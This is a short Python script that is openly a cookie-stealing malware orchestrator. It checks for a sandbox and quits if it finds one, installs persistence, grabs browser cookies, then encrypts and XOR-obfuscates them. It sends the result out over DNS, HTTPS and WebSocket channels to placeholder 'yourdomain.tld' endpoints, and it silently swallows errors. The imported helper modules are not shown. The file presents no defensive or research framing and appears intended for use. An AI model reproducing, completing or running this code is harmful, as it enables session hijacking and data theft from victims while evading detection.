#!/usr/bin/env python3
import json, base64, random
from core import encryptor, sandbox_check, exfil_dns, exfil_https, exfil_ws
from plugins import grab_cookies, fake_sysmon
from utils import xor, persistence

CONFIG = {
    "dns_domain": "stealth.yourdomain.tld",
    "https_endpoint": "https://yourdomain.tld/exfil",
    "websocket_endpoint": "wss://yourdomain.tld/ws",
    "channels": ["dns", "https", "ws"],
    "persistence": True
}

def run():
    if sandbox_check.is_sandbox(): return "[!] Sandbox detected."
    if CONFIG['persistence']: persistence.persist()
    cookies = grab_cookies.grab()
    key = encryptor.generate_key()
    payload = json.dumps(cookies)
    encrypted = encryptor.encrypt_data(payload, key)
    final = xor.xor(encrypted.encode()).hex()
    for ch in CONFIG['channels']:
        try:
            globals()[f"exfil_{ch}"].exfil(final)
        except: pass
    return f"[✓] Done. Exfiltrated {len(cookies)} cookies."

if __name__ == "__main__":
    print(run())